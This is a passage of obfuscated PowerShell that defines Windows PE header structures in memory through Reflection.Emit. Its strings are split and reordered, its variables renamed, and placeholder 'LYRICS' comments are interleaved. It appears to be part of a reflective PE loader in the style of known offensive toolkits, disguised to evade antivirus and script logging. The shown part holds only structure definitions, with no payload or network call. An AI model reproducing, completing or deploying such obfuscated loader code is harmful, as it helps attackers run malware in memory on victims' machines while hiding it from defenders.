        ($VAR011.("{2}{1}{0}"-f'ld','eFie','Defin'  ).Invoke( ( "{0}{2}{1}"-f'CONS','4','T11'), $VAR020, ( "{0}{1}{2}" -f'Pu','b','lic'))).("{2}{1}{0}"-f't','tOffse','Se').Invoke( 184  ) |  & ( "{2}{0}{1}"-f 'ut-N','ull','O')
        (  $VAR011.( "{1}{2}{0}"-f'Field','Def','ine'  ).Invoke( ( "{1}{2}{0}"-f'ST115','C','ON'), $VAR020, ( "{1}{0}"-f 'blic','Pu' ) )).( "{1}{0}{2}" -f 'e','SetOffs','t').Invoke(192) |     &  ("{1}{2}{0}" -f'll','Out-','Nu')
        ($VAR011.( "{2}{1}{0}"-f 'Field','fine','De').Invoke(  ( "{2}{1}{0}"-f'20','ONST1','C' ), $VAR020, (  "{1}{0}" -f'c','Publi' ) )).(  "{2}{1}{0}"-f 'Offset','t','Se' ).Invoke(200 )   |   &("{0}{1}" -f'Out-Nul','l' )
# LYRICS071
# LYRICS072
        ( $VAR011.(  "{1}{3}{2}{0}" -f'eField','De','n','fi'  ).Invoke(  'IAT', $VAR020, ( "{1}{0}"-f 'ic','Publ'  )  )  ).(  "{1}{2}{3}{0}"-f't','S','etOffs','e').Invoke(  208  ) |     & (  "{1}{0}"-f'ull','Out-N')
        ( $VAR011.("{3}{1}{2}{0}"-f'd','e','l','DefineFi').Invoke(  ( "{1}{2}{0}"-f '6','CON','ST11' ), $VAR020, ("{0}{1}" -f 'Publ','ic'  ))).( "{0}{1}{2}"-f 'SetO','ffse','t' ).Invoke(216  )   |    &(  "{1}{2}{0}"-f'll','Out-N','u')
        ( $VAR011.( "{0}{1}{2}" -f'Defi','neFi','eld' ).Invoke(( "{1}{0}"-f'ST117','CON'), $VAR020, (  "{0}{1}"-f'Publi','c'  ))).(  "{1}{0}{2}" -f 'O','Set','ffset'  ).Invoke(  224 )   | & ("{0}{1}{2}" -f'Ou','t-','Null')
# LYRICS073
# LYRICS074
        ( $VAR011.(  "{3}{1}{2}{0}" -f'ld','fineFi','e','De' ).Invoke( ( "{0}{2}{1}" -f 'R','ed','eserv'), $VAR020, ("{2}{0}{1}" -f'i','c','Publ')) ).( "{1}{2}{0}" -f'set','SetO','ff'  ).Invoke(232) |   &  ("{0}{1}{2}" -f'O','ut-Nu','ll')
            $VAR023   = $VAR011.(  "{2}{0}{1}"-f'eTy','pe','Creat'  ).Invoke( )
            $VAR010 |  & ("{2}{1}{0}" -f 'd-Member','d','A'  ) -MemberType ( "{0}{1}{2}"-f 'N','oteP','roperty' ) -Name (  "{1}{0}" -f 'ST066','CON') -Value $VAR023
# LYRICS075
# LYRICS076
            $VAR019  =   ("{11}{17}{7}{15}{6}{9}{14}{10}{1}{16}{2}{4}{8}{0}{12}{13}{3}{5}"-f'ef','icitLayo',' Sea','eld','led,','Init',', Class,','las',' B',' Public','Expl','A','oreF','i',', ','s','ut,','utoLayout, AnsiC' )
            $VAR011 = $VAR014.(  "{1}{0}{2}"-f 'fineTyp','De','e').Invoke(  ( "{2}{0}{1}" -f'N','ST118','CO'), $VAR019, [System.ValueType], 224  )
        ( $VAR011.(  "{2}{0}{3}{1}" -f 'n','Field','Defi','e'  ).Invoke( ("{1}{0}"-f'gic','Ma'), $VAR021, ( "{1}{0}" -f 'c','Publi' )  )).( "{1}{0}{2}" -f'etO','S','ffset' ).Invoke(0  )  |  &  ("{1}{2}{0}"-f'Null','Out','-')
        (  $VAR011.(  "{2}{0}{3}{1}"-f'f','neField','De','i').Invoke(  (  "{2}{0}{1}"-f'O','NST065','C' ), [Byte], (  "{2}{0}{1}" -f'l','ic','Pub'  ) )).(  "{0}{1}{2}" -f'Set','Offse','t'  ).Invoke(  2 )  |   &  ("{1}{0}"-f 'll','Out-Nu'  )
        ($VAR011.("{1}{0}{2}" -f'eF','Defin','ield'  ).Invoke(( "{1}{0}"-f'064','CONST' ), [Byte], ("{1}{0}"-f'ic','Publ' ))).("{0}{2}{1}" -f'S','ffset','etO').Invoke(  3 )  | & (  "{0}{2}{1}" -f'Out','ll','-Nu' )
        ( $VAR011.( "{1}{2}{0}" -f'ld','D','efineFie'  ).Invoke(  ( "{1}{2}{0}" -f '63','CONS','T0'  ), [UInt32], ("{0}{1}" -f 'Pu','blic')  )  ).(  "{1}{0}{2}" -f'etO','S','ffset'  ).Invoke(4) |   &  ( "{0}{1}{2}" -f 'Out-Nu','l','l')
# LYRICS077
# LYRICS078
        (  $VAR011.(  "{1}{0}{2}"-f 'e','D','fineField' ).Invoke(("{1}{2}{0}" -f'2','CO','NST06' ), [UInt32], (  "{2}{0}{1}"-f'i','c','Publ')) ).(  "{1}{0}{2}" -f 'etOff','S','set'  ).Invoke(  8  ) |   &  ("{1}{2}{0}" -f 'l','Out-Nu','l')
        ( $VAR011.( "{2}{0}{1}" -f'neFi','eld','Defi' ).Invoke(  ( "{1}{0}" -f'61','CONST0' ), [UInt32], (  "{1}{0}" -f'c','Publi'  )  ) ).("{1}{0}{2}" -f 'tOffse','Se','t'  ).Invoke( 12 ) |    & ("{2}{0}{1}"-f 'ut-','Null','O'  )
        (  $VAR011.(  "{1}{0}{2}"-f'eFiel','Defin','d'  ).Invoke( ( "{0}{1}" -f 'CONST06','0' ), [UInt32], ("{2}{0}{1}"-f'ub','lic','P' ))).( "{1}{2}{0}"-f'et','Set','Offs'  ).Invoke( 16  ) |     &  ("{2}{1}{0}" -f'Null','ut-','O')
        (  $VAR011.(  "{2}{1}{0}" -f'ield','F','Define'  ).Invoke(  ("{1}{2}{0}" -f 'NST059','C','O' ), [UInt32], (  "{1}{0}"-f'blic','Pu' )  )).( "{0}{1}{2}" -f'S','et','Offset'  ).Invoke(20) |   &(  "{1}{2}{0}" -f'll','Out-N','u' )
        (  $VAR011.("{2}{1}{0}"-f'ld','efineFie','D' ).Invoke(("{1}{0}{2}"-f'S','CON','T119'  ), [UInt32], ("{1}{2}{0}" -f'c','Pu','bli'  )  ) ).(  "{0}{1}" -f'SetOffs','et'  ).Invoke( 24)   |     &  (  "{0}{2}{1}"-f'O','-Null','ut'  )
        ($VAR011.(  "{1}{2}{0}{3}"-f 'iel','D','efineF','d'  ).Invoke(( "{1}{0}" -f 'ONST058','C'), [UInt32], ( "{1}{0}" -f'c','Publi'))).( "{0}{1}{2}" -f 'SetO','ffse','t').Invoke(  28)   |    &("{0}{2}{1}" -f 'O','Null','ut-')
        (  $VAR011.(  "{1}{2}{0}"-f'eld','DefineF','i' ).Invoke((  "{0}{1}" -f'CO','NST057'  ), [UInt32], ("{1}{0}"-f 'ublic','P' ) ) ).("{2}{1}{0}"-f'set','tOff','Se' ).Invoke(32  )   |   &  (  "{1}{2}{0}" -f'l','Out','-Nul'  )
        ($VAR011.("{1}{0}{2}" -f'Fiel','Define','d' ).Invoke( ("{1}{2}{0}" -f '56','CON','ST0'), [UInt32], ( "{0}{2}{1}" -f'Pu','ic','bl')  )  ).( "{1}{0}"-f 'ffset','SetO' ).Invoke( 36 )   |    &  ( "{0}{1}" -f'Out-Nul','l')
        ( $VAR011.( "{0}{1}{2}" -f'Def','in','eField').Invoke(  ("{2}{0}{1}" -f 'S','T055','CON' ), [UInt16], ( "{2}{1}{0}" -f 'c','bli','Pu'))  ).("{1}{0}{2}"-f'ff','SetO','set').Invoke( 40  )  | &("{0}{1}{2}" -f'Out-N','u','ll' )
        ($VAR011.(  "{2}{1}{0}" -f'd','Fiel','Define' ).Invoke( ( "{1}{0}{2}"-f 'ONS','C','T054'), [UInt16], ( "{1}{2}{0}"-f'ic','Pub','l' )  )  ).(  "{0}{1}{2}" -f 'SetOffs','e','t'  ).Invoke(  42  ) |   & ( "{1}{0}"-f'l','Out-Nul')
# LYRICS079
# LYRICS080
        (  $VAR011.("{3}{2}{0}{1}"-f'e','ld','Fi','Define').Invoke((  "{1}{0}{2}" -f'ONS','C','T053' ), [UInt16], ("{0}{1}{2}"-f'P','ubl','ic' ))  ).("{2}{1}{0}" -f'fset','f','SetO' ).Invoke(  44 )  |  & ( "{0}{1}{2}"-f 'Out-Nu','l','l' )
        ($VAR011.(  "{1}{2}{0}" -f 'ield','Defin','eF'  ).Invoke( ( "{0}{2}{1}" -f'CON','T052','S' ), [UInt16], (  "{1}{0}"-f'blic','Pu' ))  ).(  "{2}{0}{1}"-f'etOffs','et','S'  ).Invoke( 46  )   |    & ("{0}{1}{2}"-f 'O','ut-Nu','ll')
        (  $VAR011.("{2}{0}{1}"-f'l','d','DefineFie'  ).Invoke((  "{1}{0}{2}"-f 'NST0','CO','51'), [UInt16], ("{1}{2}{0}" -f 'c','Publ','i' ))).( "{0}{1}" -f'SetOff','set' ).Invoke(48  )  |  &  (  "{2}{1}{0}"-f'll','u','Out-N')
        ( $VAR011.("{0}{1}{2}" -f 'Defin','eFi','eld'  ).Invoke(( "{0}{1}{2}"-f 'CO','NST0','50' ), [UInt16], ( "{0}{1}"-f'Pub','lic' ) )).( "{2}{0}{3}{1}"-f 'tOff','t','Se','se'  ).Invoke(  50)   |    &  ("{2}{1}{0}"-f 'll','Nu','Out-' )
        (  $VAR011.(  "{1}{2}{0}" -f'neField','D','efi' ).Invoke( ("{1}{0}{2}"-f 'ON','C','ST049' ), [UInt32], ("{2}{1}{0}" -f 'ic','l','Pub')  )  ).( "{3}{2}{0}{1}"-f 'ffse','t','O','Set'  ).Invoke(  52 )   |   & ( "{1}{0}{2}" -f'-','Out','Null')
        (  $VAR011.( "{2}{0}{1}" -f 'efineFie','ld','D'  ).Invoke(  (  "{1}{2}{0}"-f'T033','C','ONS'), [UInt32], ("{0}{1}" -f 'P','ublic' )  )  ).( "{2}{0}{1}" -f 'e','tOffset','S').Invoke(  56) |    &(  "{0}{1}{2}"-f'Out','-Nu','ll'  )
        ( $VAR011.("{2}{0}{1}"-f'efine','Field','D'  ).Invoke(  (  "{0}{1}"-f'C','ONST034'), [UInt32], ( "{0}{1}"-f 'Pub','lic') ) ).("{0}{1}"-f'SetO','ffset'  ).Invoke(  60  )   |   &  ( "{1}{0}{2}"-f '-Nul','Out','l'  )
        ( $VAR011.( "{1}{0}{2}" -f'ineFiel','Def','d' ).Invoke( (  "{2}{0}{1}" -f 'N','ST048','CO'), [UInt32], ( "{0}{2}{1}" -f'Pu','lic','b' )  )).( "{2}{1}{0}"-f 'set','etOff','S' ).Invoke( 64) |    &  (  "{1}{0}" -f 't-Null','Ou' )
        ($VAR011.("{1}{0}{2}"-f'l','DefineFie','d').Invoke( (  "{1}{2}{0}" -f'47','CON','ST0'  ), $VAR017, (  "{1}{0}" -f'c','Publi')  )).( "{0}{1}"-f 'SetOffse','t').Invoke(  68  ) |  &  ( "{1}{0}{2}"-f'u','O','t-Null'  )
        ($VAR011.( "{2}{3}{0}{1}"-f'l','d','DefineF','ie' ).Invoke( (  "{2}{0}{1}"-f '0','35','CONST'  ), $VAR018, ("{1}{0}"-f 'ublic','P'  ))  ).( "{1}{2}{0}"-f'set','SetOf','f').Invoke(70)  |    &  (  "{2}{0}{1}"-f 'u','t-Null','O'  )
        (  $VAR011.(  "{1}{2}{0}{3}"-f 'ineFie','D','ef','ld' ).Invoke(  ( "{0}{1}" -f 'CONST0','46' ), [UInt32], ( "{0}{1}" -f 'Pub','lic')) ).(  "{2}{1}{0}" -f'Offset','et','S' ).Invoke( 72 )  | &(  "{2}{1}{0}"-f'ull','t-N','Ou'  )
        ( $VAR011.( "{2}{1}{0}{3}"-f'eFi','n','Defi','eld').Invoke( (  "{1}{2}{0}"-f'T045','CO','NS'), [UInt32], (  "{1}{2}{0}"-f'c','P','ubli' ) ) ).("{1}{0}"-f'set','SetOff'  ).Invoke(  76 ) |  &  ("{2}{0}{1}"-f'N','ull','Out-')
# LYRICS081
# LYRICS082
        ( $VAR011.("{0}{1}{2}"-f 'D','efineFi','eld' ).Invoke(  ("{0}{1}" -f'CONST04','4' ), [UInt32], (  "{1}{0}"-f 'ublic','P'  )  )).( "{0}{2}{1}" -f 'Set','ffset','O'  ).Invoke(  80) |    & ("{1}{2}{0}"-f'Null','O','ut-')
        (  $VAR011.(  "{1}{3}{2}{0}"-f'ld','Def','e','ineFi' ).Invoke(  (  "{1}{2}{0}" -f'NST043','C','O' ), [UInt32], (  "{1}{0}" -f 'c','Publi')  )).(  "{1}{2}{0}" -f'et','SetOf','fs' ).Invoke( 84 )  |   & ( "{1}{0}{2}"-f'-','Out','Null'  )
        (  $VAR011.( "{2}{1}{0}{3}"-f'e','i','DefineF','ld').Invoke(  (  "{0}{1}" -f'CONST','105'), [UInt32], ("{1}{0}" -f'ic','Publ')) ).("{0}{1}{2}" -f'SetOffs','e','t' ).Invoke( 88 ) |    &("{0}{1}{2}"-f 'Out','-N','ull' )
        ( $VAR011.( "{2}{0}{1}"-f 'l','d','DefineFie'  ).Invoke( ( "{1}{0}"-f '06','CONST1' ), [UInt32], ( "{0}{1}"-f'Publ','ic') ) ).("{0}{3}{2}{1}"-f 'Set','t','e','Offs' ).Invoke(92)  |   & ( "{1}{0}{2}" -f'ut-Nu','O','ll' )
        (  $VAR011.( "{2}{1}{0}" -f'eld','fineFi','De').Invoke(("{1}{0}{2}" -f 'T1','CONS','07'  ), $VAR020, (  "{1}{0}" -f 'c','Publi' )  )  ).( "{0}{1}{3}{2}"-f'SetOff','s','t','e'  ).Invoke(  96 )   |     & ( "{0}{1}{2}"-f 'Out-','N','ull'  )
        (  $VAR011.( "{2}{1}{0}"-f'neField','fi','De'  ).Invoke(  ("{2}{0}{1}"-f'O','NST108','C' ), $VAR020, (  "{1}{0}" -f'ublic','P' )  )  ).(  "{0}{1}{2}"-f'S','et','Offset' ).Invoke(  104 )  |    & ( "{1}{2}{0}" -f'Null','O','ut-'  )
        ($VAR011.( "{0}{1}{3}{2}"-f'D','efi','eld','neFi' ).Invoke((  "{2}{1}{0}"-f'109','ST','CON'), $VAR020, ("{0}{1}"-f 'Publ','ic'  ) ) ).("{0}{3}{1}{2}" -f'Set','se','t','Off' ).Invoke(112 )  |   & (  "{1}{2}{0}"-f 'ull','O','ut-N'  )
        (  $VAR011.( "{2}{1}{0}" -f'ield','fineF','De' ).Invoke( ("{2}{0}{1}"-f 'T','110','CONS' ), $VAR020, ("{0}{1}"-f 'Publi','c'))).("{0}{2}{1}{3}" -f 'Set','e','Offs','t').Invoke(  120) |  &  (  "{2}{0}{1}"-f'u','t-Null','O'  )
        ( $VAR011.(  "{3}{1}{2}{0}" -f 'eld','F','i','Define').Invoke(  ("{1}{0}" -f '111','CONST' ), $VAR020, (  "{0}{1}" -f'Publ','ic' )  )).(  "{1}{0}{2}" -f'etOf','S','fset' ).Invoke( 128)  |    & (  "{1}{0}{2}" -f 'ut-N','O','ull')
        (  $VAR011.( "{2}{0}{3}{1}"-f 'ne','d','Defi','Fiel').Invoke(  (  "{0}{1}"-f 'CONS','T112'), $VAR020, ( "{0}{2}{1}" -f'Pub','ic','l'  ) )).("{0}{1}" -f'S','etOffset' ).Invoke(136 )  |    &  (  "{1}{2}{0}"-f'll','Out-','Nu')
        ($VAR011.(  "{2}{1}{3}{0}" -f 'ield','f','De','ineF'  ).Invoke(  ( "{1}{0}"-f 'ebug','D' ), $VAR020, ("{1}{0}"-f'c','Publi' ) )  ).( "{2}{1}{0}"-f 'fset','etOf','S').Invoke(  144)  |    &  ("{0}{2}{1}" -f 'O','-Null','ut')
        ($VAR011.("{2}{1}{0}"-f 'Field','fine','De' ).Invoke(  ( "{0}{3}{1}{2}"-f 'Ar','tectu','re','chi'), $VAR020, ("{0}{1}" -f'Pu','blic')  ) ).(  "{0}{2}{1}" -f'Se','ffset','tO').Invoke( 152  )  |   &( "{2}{1}{0}"-f 'll','u','Out-N' )
        ( $VAR011.( "{1}{2}{0}" -f'Field','De','fine').Invoke( ( "{2}{0}{1}" -f 'T','113','CONS'  ), $VAR020, ("{1}{2}{0}"-f'ic','Pu','bl') ) ).("{1}{2}{0}" -f 'set','Set','Off' ).Invoke(160 )   |  &( "{0}{1}{2}" -f'Out','-N','ull' )
# LYRICS083
# LYRICS084
        ( $VAR011.("{3}{1}{2}{0}"-f'ld','in','eFie','Def').Invoke( ("{0}{1}" -f'CON','ST114' ), $VAR020, ("{1}{0}{2}" -f'b','Pu','lic' )  )  ).(  "{2}{3}{0}{1}"-f 'e','t','SetO','ffs' ).Invoke(  168 )  |    &("{1}{2}{0}"-f'l','Ou','t-Nul'  )
        ( $VAR011.(  "{0}{1}{3}{2}" -f 'Define','Fi','d','el').Invoke(("{1}{0}{2}"-f 'T1','CONS','15'), $VAR020, ( "{0}{1}"-f 'Publi','c' ) ) ).("{0}{1}{2}"-f 'Set','O','ffset'  ).Invoke( 176 )   |    & (  "{2}{1}{0}" -f '-Null','ut','O'  )
        (  $VAR011.(  "{0}{1}{2}" -f 'DefineF','iel','d'  ).Invoke( ("{0}{2}{1}" -f 'CO','T120','NS'), $VAR020, ( "{1}{0}"-f'c','Publi'  )) ).( "{2}{1}{0}{3}" -f'ffse','tO','Se','t' ).Invoke(  184  )   |   &("{2}{1}{0}" -f'ull','t-N','Ou' )
        ($VAR011.("{0}{3}{2}{1}" -f 'De','Field','ne','fi').Invoke( 'IAT', $VAR020, (  "{0}{1}"-f 'Pub','lic') )  ).( "{1}{2}{0}"-f'ffset','Se','tO'  ).Invoke(  192)   |   & ( "{1}{2}{0}"-f 'ull','Out','-N')
# LYRICS085
# LYRICS086
        (  $VAR011.(  "{1}{3}{2}{0}" -f 'Field','D','ne','efi' ).Invoke(("{0}{2}{1}" -f'C','ST116','ON'  ), $VAR020, ( "{0}{1}{2}" -f 'Pub','l','ic')  )  ).(  "{2}{0}{1}"-f 'fs','et','SetOf' ).Invoke(200 )   |  &  (  "{0}{1}{2}"-f'Ou','t-Nu','ll'  )
        ($VAR011.( "{2}{1}{0}" -f 'd','l','DefineFie').Invoke( ("{0}{1}{2}" -f'C','ONST1','17'  ), $VAR020, (  "{1}{0}" -f'ic','Publ'  )) ).(  "{0}{1}" -f 'SetOf','fset').Invoke( 208)  |     &("{0}{1}"-f 'Out-','Null'  )
        (  $VAR011.( "{0}{2}{1}{3}"-f'D','ne','efi','Field').Invoke( ("{0}{1}" -f'R','eserved' ), $VAR020, (  "{0}{1}" -f'Publi','c'))  ).("{1}{0}{2}" -f't','Se','Offset').Invoke(  216 ) |     &( "{0}{2}{1}" -f 'O','t-Null','u'  )
            $VAR024   = $VAR011.(  "{2}{1}{0}" -f 'e','eTyp','Creat').Invoke(  )
            $VAR010   |    &( "{2}{1}{0}" -f 'ember','-M','Add') -MemberType (  "{2}{0}{1}{3}"-f 'o','pe','NotePr','rty') -Name ("{1}{2}{0}" -f '18','CON','ST1' ) -Value $VAR024
# LYRICS087
# LYRICS088
            $VAR019 = ("{5}{17}{12}{14}{18}{2}{7}{6}{10}{8}{19}{3}{0}{1}{4}{9}{16}{11}{15}{13}" -f'out, Sea','le','Clas','alLay','d','AutoLa','lass, Pu','s, C',' S',',','blic,','e','ut,','FieldInit',' An','fore',' B','yo','si','equenti' )
            $VAR011   =  $VAR014.(  "{2}{0}{1}"-f 'ineTy','pe','Def'  ).Invoke(  ( "{2}{1}{0}" -f'ST03164','ON','C'), $VAR019, [System.ValueType], 264)
            $VAR011.(  "{3}{2}{1}{0}" -f 'd','fineFiel','e','D' ).Invoke((  "{1}{0}" -f 'e','Signatur' ), [UInt32], ( "{1}{0}"-f 'blic','Pu'  )  )   |    &(  "{2}{1}{0}" -f'll','t-Nu','Ou'  )
# LYRICS089
# LYRICS090
            $VAR011.( "{0}{2}{1}"-f'D','ld','efineFie').Invoke(  (  "{0}{1}{2}"-f'CON','ST','121'  ), $VAR022, (  "{1}{0}"-f 'ublic','P')  )   |   &  (  "{1}{2}{0}" -f'Null','Ou','t-'  )
            $VAR011.( "{2}{0}{1}" -f 'in','eField','Def'  ).Invoke( ( "{0}{1}{2}" -f 'CO','N','ST122'  ), $VAR023, ( "{1}{0}"-f'blic','Pu')) |  & ( "{1}{2}{0}"-f'-Null','Ou','t')
# LYRICS091
# LYRICS092
            $VAR025   =  $VAR011.( "{2}{0}{1}" -f'at','eType','Cre').Invoke( )
            $VAR010 |   & (  "{2}{0}{1}"-f 'e','r','Add-Memb'  ) -MemberType ( "{2}{1}{0}{3}" -f'eProp','t','No','erty') -Name ( "{1}{0}{2}" -f'0','CONST','3164' ) -Value $VAR025
# LYRICS093
# LYRICS094
            $VAR019   = ("{9}{10}{4}{15}{11}{8}{12}{13}{0}{14}{2}{1}{6}{5}{7}{3}"-f'ic, Sequ','ayou','lL','it','A','f','t, Sealed, Be','oreFieldIn','las','AutoLayou','t, ','ass, C','s',', Publ','entia','nsiCl' )
# LYRICS095
# LYRICS096
            $VAR011 =   $VAR014.("{2}{1}{0}" -f'ype','neT','Defi').Invoke(  ( "{0}{2}{1}" -f'CONS','03132','T'), $VAR019, [System.ValueType], 248)
            $VAR011.( "{0}{3}{2}{1}"-f'D','eld','ineFi','ef'  ).Invoke(  ("{1}{0}{2}" -f 'ignatur','S','e'), [UInt32], ("{1}{0}"-f 'ublic','P'  )  )   |   &  ( "{0}{1}{2}"-f'Ou','t-Nul','l')
# LYRICS097
# LYRICS098
            $VAR011.( "{2}{1}{0}" -f 'neField','i','Def'  ).Invoke( ( "{1}{0}"-f'ONST121','C'  ), $VAR022, ( "{1}{0}"-f'c','Publi')  )   |     & (  "{0}{1}" -f'Out-Nul','l')
            $VAR011.("{0}{2}{1}"-f 'DefineF','d','iel').Invoke( ( "{2}{0}{1}"-f 'NST1','22','CO' ), $VAR024, ( "{1}{0}" -f 'ic','Publ'))  |  &  ("{1}{0}{2}" -f'ut','O','-Null'  )
            $VAR026 =   $VAR011.( "{0}{2}{1}" -f'Cr','teType','ea' ).Invoke(    )
# LYRICS099
# LYRICS100
            $VAR010 |   &("{2}{0}{1}" -f'd-Membe','r','Ad' ) -MemberType ("{0}{2}{1}" -f'Not','operty','ePr' ) -Name ("{0}{1}{2}"-f'CONST','0313','2'  ) -Value $VAR026
# LYRICS101
# LYRICS102
            $VAR019  =   (  "{8}{11}{3}{16}{5}{1}{9}{13}{15}{0}{14}{4}{2}{10}{12}{6}{17}{7}"-f'ubli','Ansi','equentialLayo','to',', S',' ','ealed, B','FieldInit','A','Class','ut, ','u','S',', Class','c',', P','Layout,','efore'  )
            $VAR011   =  $VAR014.(  "{0}{1}{2}"-f 'Defin','e','Type'  ).Invoke(( "{1}{2}{0}"-f 'NST123','C','O'  ), $VAR019, [System.ValueType], 64)
            $VAR011.( "{1}{3}{0}{2}"-f'eFie','Def','ld','in'  ).Invoke(  ( "{0}{1}" -f'CON','ST124' ), [UInt16], ( "{0}{1}" -f 'Publi','c') )   |     &( "{1}{0}{2}" -f 'l','Out-Nu','l' )
            $VAR011.(  "{1}{0}{3}{2}" -f 'eFie','Defin','d','l'  ).Invoke( (  "{2}{0}{1}" -f 'O','NST125','C'  ), [UInt16], ( "{1}{0}"-f'c','Publi'  ) )   |    & ("{1}{0}{2}"-f'l','Out-Nu','l' )
            $VAR011.( "{1}{0}{3}{2}" -f 'in','Def','ld','eFie').Invoke(("{2}{1}{0}" -f'26','ST1','CON'), [UInt16], (  "{0}{2}{1}"-f'P','blic','u' ) )   |    &(  "{1}{2}{0}"-f 'l','Out-','Nul' )
# LYRICS103
# LYRICS104
            $VAR011.(  "{1}{2}{0}"-f 'ld','D','efineFie' ).Invoke( ( "{0}{1}{2}"-f 'CON','ST12','7'), [UInt16], (  "{0}{1}{2}" -f 'Publ','i','c' ) )  |   &("{0}{1}{2}" -f 'Out-Nu','l','l' )
            $VAR011.("{1}{2}{0}{3}"-f 'neF','Def','i','ield').Invoke(  ("{1}{0}{2}"-f'NS','CO','T128'  ), [UInt16], ( "{0}{1}{2}" -f 'Pu','b','lic'  ))  |   &  (  "{1}{0}"-f'll','Out-Nu')
            $VAR011.( "{0}{1}{2}" -f 'De','fineF','ield' ).Invoke( ( "{2}{1}{0}"-f'9','2','CONST1' ), [UInt16], ("{1}{0}" -f'c','Publi'  ))   |  &  (  "{1}{2}{0}" -f'-Null','Ou','t' )
            $VAR011.("{2}{0}{1}"-f'eF','ield','Defin').Invoke( (  "{2}{0}{1}" -f'ONS','T130','C'), [UInt16], ("{2}{0}{1}"-f 'i','c','Publ') )  |   & ( "{1}{0}"-f 'ull','Out-N')
            $VAR011.( "{0}{3}{1}{2}" -f'De','eFie','ld','fin' ).Invoke(  (  "{2}{0}{1}" -f'NS','T131','CO' ), [UInt16], ("{0}{1}"-f 'Pub','lic'  ) )  |   & (  "{0}{1}" -f'O','ut-Null' )
            $VAR011.("{0}{1}{2}" -f'Defin','eFi','eld' ).Invoke(  ("{2}{0}{1}"-f 'S','T132','CON' ), [UInt16], (  "{0}{1}" -f 'Pu','blic' )  ) |  & ( "{2}{1}{0}" -f 'll','t-Nu','Ou' )
            $VAR011.( "{0}{1}{2}"-f'Def','ine','Field').Invoke(( "{1}{0}{2}" -f 'ON','C','ST133'  ), [UInt16], ("{0}{1}" -f 'Publ','ic')  )  |  &("{2}{1}{0}" -f 'l','ul','Out-N'  )
            $VAR011.("{0}{1}{2}"-f 'Defi','neF','ield').Invoke( ("{1}{2}{0}" -f '4','CO','NST13'  ), [UInt16], ("{1}{0}"-f 'ublic','P'  ) ) |   &  (  "{0}{1}{2}" -f'Ou','t-','Null'  )
            $VAR011.("{0}{1}{2}"-f 'DefineF','ie','ld'  ).Invoke(( "{1}{2}{0}" -f'35','CONST','1'), [UInt16], ( "{1}{0}"-f'c','Publi' )) | & ( "{2}{1}{0}" -f 'Null','ut-','O'  )
# LYRICS105
# LYRICS106
            $VAR011.( "{2}{3}{1}{0}"-f 'd','el','DefineF','i' ).Invoke(( "{1}{2}{0}"-f '6','CO','NST13'  ), [UInt16], ("{1}{2}{0}" -f 'c','P','ubli'  )  ) | &  ( "{0}{1}{2}"-f'Ou','t-Nul','l' )
            $VAR011.(  "{2}{0}{1}"-f 'f','ineField','De' ).Invoke(  (  "{2}{0}{1}"-f 'O','NST137','C'  ), [UInt16], (  "{1}{0}" -f'ublic','P'  ))  |  & ("{1}{0}{2}" -f 'u','O','t-Null')
# LYRICS107
            $VAR027  = $VAR011.(  "{1}{0}{2}{3}"-f 'Fi','Define','e','ld' ).Invoke(  (  "{2}{0}{1}"-f'T13','8','CONS'), [UInt16[]], (  "{4}{2}{3}{1}{0}" -f'shal','ieldMar','c, H','asF','Publi'  ))
# LYRICS108
# LYRICS109
            $VAR028 =  $VAR097::"bY`VAla`RR`AY"
            $VAR029 =   @($VAR098.( "{0}{2}{1}"-f'G','ld','etFie'  ).Invoke(( "{1}{0}{2}" -f'Co','Size','nst'  ) ) )
# LYRICS110
# LYRICS111
            $VAR030   = &  (  "{0}{2}{1}" -f 'New-O','ct','bje' ) ("{10}{1}{11}{8}{2}{9}{6}{4}{5}{7}{0}{3}"-f'ui','tem.Reflectio','us','lder','ibu','te','mAttr','B','it.C','to','Sys','n.Em'  )(  $VAR015, $VAR028, $VAR029, @([Int32] 4 ))
            $VAR027.("{3}{0}{4}{1}{2}"-f't','ustomAttrib','ute','Se','C' ).Invoke($VAR030)
# LYRICS112
            $VAR011.(  "{3}{0}{1}{2}" -f 'neF','i','eld','Defi'  ).Invoke( ( "{0}{1}{2}" -f 'CONS','T','139'), [UInt16], (  "{1}{0}{2}" -f 'ubl','P','ic'  )  )  |    & ( "{0}{2}{1}" -f 'Ou','Null','t-'  )
# LYRICS113
# LYRICS114
            $VAR011.("{1}{2}{0}"-f'eld','Define','Fi').Invoke( (  "{0}{2}{1}"-f 'C','40','ONST1'  ), [UInt16], ("{0}{1}" -f 'Pu','blic')) |   &  (  "{1}{2}{0}"-f'll','Out-N','u' )
# LYRICS115
# LYRICS116
            $VAR031   =   $VAR011.("{2}{1}{0}"-f'ld','ineFie','Def').Invoke(  ( "{0}{2}{1}"-f'C','NST1382','O'), [UInt16[]], ( "{3}{4}{2}{0}{1}{5}"-f' H','asFieldMar','ic,','Pu','bl','shal' ) )
            $VAR028   =  $VAR097::"B`yv`ALA`RRaY"
# LYRICS117
# LYRICS118
            $VAR030 =     & ( "{1}{0}{2}" -f 'ew-Obje','N','ct'  ) ("{1}{7}{5}{4}{3}{6}{2}{0}"-f 'r','Syst','ttributeBuilde','tom','.Emit.Cus','Reflection','A','em.' )(  $VAR015, $VAR028, $VAR029, @([Int32] 10  ))
# LYRICS119
# LYRICS120
            $VAR031.(  "{4}{2}{1}{3}{0}"-f 'e','Attribu','ustom','t','SetC'  ).Invoke(  $VAR030  )
# LYRICS121
            $VAR011.(  "{1}{3}{0}{2}" -f 'l','Define','d','Fie' ).Invoke( ( "{0}{2}{1}" -f'CONST1','1','4'  ), [Int32], ("{2}{1}{0}" -f'blic','u','P') )   | & ("{2}{0}{1}" -f'ut-Nul','l','O' )
            $VAR032  =  $VAR011.(  "{2}{1}{0}"-f'pe','Ty','Create'  ).Invoke(  )
            $VAR010   |   & (  "{1}{0}{2}"-f '-Me','Add','mber' ) -MemberType ( "{1}{0}{2}{3}"-f 'Prop','Note','ert','y'  ) -Name ("{2}{0}{1}" -f'1','23','CONST' ) -Value $VAR032
# LYRICS122
# LYRICS123
            $VAR019  = ( "{5}{8}{7}{1}{16}{9}{10}{4}{12}{3}{11}{13}{0}{17}{6}{2}{14}{15}" -f'aled, Befor','ut, A','iel','ential','as','Auto','F','yo','La','Clas','s, Cl','Layou','s, Public, Sequ','t, Se','dIni','t','nsi','e'  )
            $VAR011   =   $VAR014.("{2}{1}{0}" -f'neType','i','Def' ).Invoke( (  "{0}{1}"-f 'CONST1','42' ), $VAR019, [System.ValueType], 40 )
# LYRICS124
# LYRICS125
# LYRICS126
